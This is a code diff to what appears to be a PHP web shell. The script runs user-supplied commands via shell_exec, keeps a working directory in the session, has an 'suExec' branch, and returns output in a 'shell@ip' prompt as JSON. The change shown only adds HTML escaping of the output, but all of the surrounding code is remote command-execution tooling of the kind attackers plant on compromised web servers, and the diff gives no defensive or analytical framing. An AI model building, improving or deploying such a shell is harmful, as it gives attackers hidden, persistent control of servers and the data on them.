@@ -41,11 +41,11 @@
 
 
             if ($pwd != $_SESSION['cwd']) {
-                $response = "<pre type='error'>[!]ERROR: Directory '" . $_SESSION['cwd'] . "' not found or not permission</pre>";
+                $response = "[!]ERROR: Directory '" . $_SESSION['cwd'] . "' not found or not permission";
                 $_SESSION['cwd'] = $cwdant;
             } else {
                 $pwd = getcwd();
-                $response = "<pre type='output'>shell@$ip($pwd): $cmd</pre>";
+                $response = "shell@$ip($pwd): $cmd";
             }
 
 
@@ -56,10 +56,10 @@
             $implo = implode("/", $split);
             if ($implo == "") {
                 $_SESSION['cwd'] = '/';
-                $response = "</pre?><pre type='output'>Directory: ".$_SESSION['cwd']."</pre>";
+                $response = "Directory: ".$_SESSION['cwd'];
             } else {
                 $_SESSION['cwd'] = $implo;
-                $response = "</pre><pre type='output'>Directory: ".$_SESSION['cwd']."</pre>";
+                $response = "Directory: ".$_SESSION['cwd'];
             }
         }
 
@@ -67,7 +67,7 @@
 
 
         header("Content-Type: application/json");
-        echo json_encode(array("value"=>$response));
+        echo json_encode(array("value"=>"<pre type='output'>".htmlentities($response)."</pre>"));
         die();
 
     } elseif ($parse[0] == "suExec") {
@@ -122,11 +122,11 @@
 
 
 
-        $response = "<pre type='output'>shell@".$ip."(".$pwd."): ".$cmd."</pre><pre type='output'>".$out."</pre>";
+        $response = "shell@".$ip."(".$pwd."): ".$cmd."\n\n".$out."";
 
 
         header("Content-Type: application/json");
-        echo json_encode(array("value"=>$response));
+        echo json_encode(array("value"=>"<pre type='output'>".htmlentities($response)."</pre>"));
         die();
 
 
@@ -137,11 +137,11 @@
         $pwd = getcwd();
 
         $out = shell_exec($cmd);
-        $response = "<pre type='output'>shell@".$ip."(".$pwd."): ".$cmd."</pre><pre type='output'>".$out."</pre>";
+        $response = "shell@".$ip."(".$pwd."): ".$cmd."\n\n".$out;
 
 
         header("Content-Type: application/json");
-        echo json_encode(array("value"=>$response));
+        echo json_encode(array("value"=>"<pre type='output'>".htmlentities($response)."</pre>"));
         die();
    }
 
